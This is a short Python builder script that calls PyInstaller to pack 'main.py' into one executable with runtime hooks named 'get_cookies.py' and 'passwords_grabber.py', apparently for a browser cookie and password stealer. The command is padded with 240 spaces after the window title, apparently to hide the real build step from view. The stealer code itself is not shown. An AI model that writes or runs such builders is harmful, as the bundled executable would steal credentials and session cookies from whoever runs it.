import os
import sys

pyinstaller_command = 'start cmd /k "title Building file...' + ' '*240 + '& pyinstaller -F ' + '--runtime-hook=resources/misc.py --runtime-hook=resources/get_cookies.py --runtime-hook=resources/passwords_grabber.py "main.py" & pause & exit"'

os.system(pyinstaller_command)
input()
